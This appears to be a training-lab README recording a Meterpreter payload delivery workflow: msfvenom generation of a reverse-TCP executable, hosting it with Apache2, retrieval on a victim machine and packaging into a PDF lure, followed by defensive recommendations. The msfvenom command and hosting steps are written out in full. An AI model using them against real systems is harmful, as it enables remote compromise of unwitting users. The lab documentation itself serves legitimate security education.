
<div align="center">

# 🛡️ Meterpreter Payload Delivery Workflow

### `Payload Generation` · `Apache2 Hosting` · `PDF Artifact` · `Controlled Lab`

<br>

<img src="https://img.shields.io/badge/Controlled-Lab%20Assessment-0969DA?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Meterpreter-Payload-8250DF?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Apache2-Hosting-1A7F37?style=for-the-badge&logo=apache&logoColor=white" />
<img src="https://img.shields.io/badge/PDF-Delivery%20Artifact-9A6700?style=for-the-badge&logoColor=white" />

<br><br>

> **A technical record of a Windows Meterpreter reverse-TCP payload delivery workflow performed in an isolated educational environment.**

</div>

---

## Overview

This write-up documents a controlled-lab workflow involving the preparation and delivery of a **Windows Meterpreter reverse-TCP payload**.

The practical covers four main stages:

```text
Payload Generation
        ↓
Apache Web Hosting
        ↓
Victim-Side Retrieval
        ↓
PDF Artifact Preparation
````

The available source material confirms these workflow stages. It does **not** provide evidence of a completed exploitation or Meterpreter session, and it does not document the exact mechanism used to embed the payload into the PDF.

---

## Objective

Document the laboratory procedure used to:

* Generate a Windows Meterpreter reverse-TCP payload.
* Host the generated executable through Apache2.
* Retrieve the payload from the victim machine.
* Incorporate the payload into a PDF-based delivery artifact.
* Preserve the available evidence without adding undocumented implementation details.

---

## Lab Environment

| Component            | Details                                                            |
| -------------------- | ------------------------------------------------------------------ |
| **Assessment Type**  | Controlled educational lab practical                               |
| **Payload Host**     | `192.168.88.246`                                                   |
| **Payload Type**     | Windows Meterpreter reverse TCP                                    |
| **Payload File**     | `payload.exe`                                                      |
| **Server Component** | Apache2                                                            |
| **Setting**          | Educational / Controlled Lab Environment                           |
| **Training Context** | NAVTTC-funded cybersecurity training, Corvit Institute, Rawalpindi |

---

## Tools Used

<div align="center">

<img src="https://img.shields.io/badge/msfvenom-Payload%20Generation-8250DF?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Meterpreter-Payload-8250DF?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Apache2-Web%20Hosting-1A7F37?style=for-the-badge&logo=apache&logoColor=white" />
<img src="https://img.shields.io/badge/PDF-Artifact%20Preparation-9A6700?style=for-the-badge&logoColor=white" />

</div>

---

# Methodology & Results

|  **#** | **Stage**                         | **Command / Action**                                                                                | **Result / Finding**                                                                                                   |
| :----: | --------------------------------- | --------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| **01** | **Payload Generation**            | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.246 LPORT=2222 -f exe -o payload.exe` | Windows Meterpreter reverse-TCP payload generated as `payload.exe`.                                                    |
| **02** | **Payload Hosting**               | `mv payload.exe /var/www/html`                                                                      | Generated payload moved to the Apache web root.                                                                        |
| **03** | **Web Server Startup**            | `service apache2 start`                                                                             | Apache2 service started for payload hosting.                                                                           |
| **04** | **Service Verification**          | `service apache2 status`                                                                            | Apache2 status checked after startup.                                                                                  |
| **05** | **Victim-Side Delivery**          | Payload downloaded on the victim machine                                                            | The source material confirms the download, but does not specify the exact URL, browser, timestamp, or download method. |
| **06** | **PDF Artifact Preparation**      | Payload incorporated into a PDF-based artifact                                                      | The source states that the payload was injected into the PDF, but the exact embedding mechanism is not documented.     |
| **07** | **Final PDF Creation**            | PDF images and icon added; final PDF created                                                        | A final PDF-based delivery artifact was produced according to the submitted material.                                  |
| **08** | **Exploitation / Session Result** | Not documented                                                                                      | No final exploitation or Meterpreter session result is evidenced in the source material.                               |

---

# Workflow at a Glance

| Stage             | Purpose                                  |                                                Status                                                |
| ----------------- | ---------------------------------------- | :--------------------------------------------------------------------------------------------------: |
| **01 · Generate** | Create the reverse-TCP executable        |    <img src="https://img.shields.io/badge/DOCUMENTED-1A7F37?style=flat-square&logoColor=white" />    |
| **02 · Host**     | Place `payload.exe` in Apache web root   |    <img src="https://img.shields.io/badge/DOCUMENTED-1A7F37?style=flat-square&logoColor=white" />    |
| **03 · Serve**    | Start and verify Apache2                 |    <img src="https://img.shields.io/badge/DOCUMENTED-1A7F37?style=flat-square&logoColor=white" />    |
| **04 · Deliver**  | Retrieve payload on victim machine       |    <img src="https://img.shields.io/badge/DOCUMENTED-1A7F37?style=flat-square&logoColor=white" />    |
| **05 · Package**  | Prepare the PDF-based artifact           |    <img src="https://img.shields.io/badge/DOCUMENTED-1A7F37?style=flat-square&logoColor=white" />    |
| **06 · Session**  | Confirm a successful Meterpreter session | <img src="https://img.shields.io/badge/NOT%20DOCUMENTED-CF222E?style=flat-square&logoColor=white" /> |

---

# Key Findings

|                                                Status                                               | Finding                                                                                                                                                  |
| :-------------------------------------------------------------------------------------------------: | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
|    <img src="https://img.shields.io/badge/DOCUMENTED-0969DA?style=flat-square&logoColor=white" />   | The exercise demonstrates a **malware-delivery workflow** spanning payload generation, web hosting, victim-side retrieval, and PDF artifact preparation. |
|    <img src="https://img.shields.io/badge/CONFIGURED-8250DF?style=flat-square&logoColor=white" />   | The payload was configured as a **Windows Meterpreter reverse-TCP** executable using `192.168.88.246` as the listener host and TCP port `2222`.          |
|     <img src="https://img.shields.io/badge/VERIFIED-1A7F37?style=flat-square&logoColor=white" />    | **Apache2** served as the web-hosting component for `payload.exe`.                                                                                       |
|    <img src="https://img.shields.io/badge/CONFIRMED-1A7F37?style=flat-square&logoColor=white" />    | The source confirms that the generated payload was downloaded on the victim machine.                                                                     |
|   <img src="https://img.shields.io/badge/UNSPECIFIED-9A6700?style=flat-square&logoColor=white" />   | PDF-based payload incorporation is confirmed, but the **exact embedding technique is not documented**.                                                   |
| <img src="https://img.shields.io/badge/NOT%20EVIDENCED-CF222E?style=flat-square&logoColor=white" /> | A completed exploitation or Meterpreter session is **not evidenced** in the submitted material.                                                          |

---

# Security Impact

<div align="center">

<img src="https://img.shields.io/badge/MALWARE%20DELIVERY-Security%20Risk-CF222E?style=for-the-badge&logoColor=white" />

</div>

In an unauthorized environment, a workflow of this type could facilitate malware delivery and potentially provide remote access to a compromised host.

Within the submitted context, the activity is described as an **educational practical in a controlled laboratory environment**, and no unauthorized production target is identified.

---

# Recommendations

| Recommendation           | Security Purpose                                                                          |
| ------------------------ | ----------------------------------------------------------------------------------------- |
| **Endpoint Protection**  | Detect and block suspicious payloads and unauthorized executable activity                 |
| **Application Controls** | Restrict execution of untrusted or downloaded executable content                          |
| **Network Controls**     | Restrict unnecessary outbound connections from endpoints                                  |
| **Sandboxing**           | Inspect suspicious PDF attachments and downloaded executables in a controlled environment |
| **Security Awareness**   | Maintain secure attachment-handling and user-awareness procedures                         |
| **Authorized Testing**   | Perform malware-delivery testing only in isolated and authorized environments             |

---

# What I Learned

This practical demonstrated how multiple stages of a delivery workflow connect together:

```text
Payload Generation
        ↓
Web Hosting
        ↓
Victim-Side Retrieval
        ↓
Document Preparation
```

It also reinforced the importance of collecting clear technical evidence at every stage and separating documented observations from details that are not present in the source material.

---

# Environment Disclaimer

> **Controlled Cybersecurity Laboratory Exercise**

All activity described in this write-up is framed as an **educational / controlled laboratory exercise**.

The report is based solely on the submitted practical material. No claim of testing against an unauthorized production system is made.

---

# Evidence

The submitted PDF contains the visual evidence associated with the workflow, including source pages covering payload generation, hosting, delivery, and PDF artifact preparation.

### [Meterpreter Payload Delivery Workflow — Full Report](./meterpreter-payload-delivery-workflow.pdf)

---

<div align="center">

<img src="https://img.shields.io/badge/Payload%20Analysis-Lab%20Research-CF222E?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Delivery-Security%20Testing-9A6700?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Technical-Documentation-8250DF?style=for-the-badge&logoColor=white" />

<br><br>

### Security Research · Controlled Testing · Technical Documentation

</div>

---

> **Repository Note:** This write-up is intended for authorized cybersecurity training, documentation, and controlled laboratory use only.

```
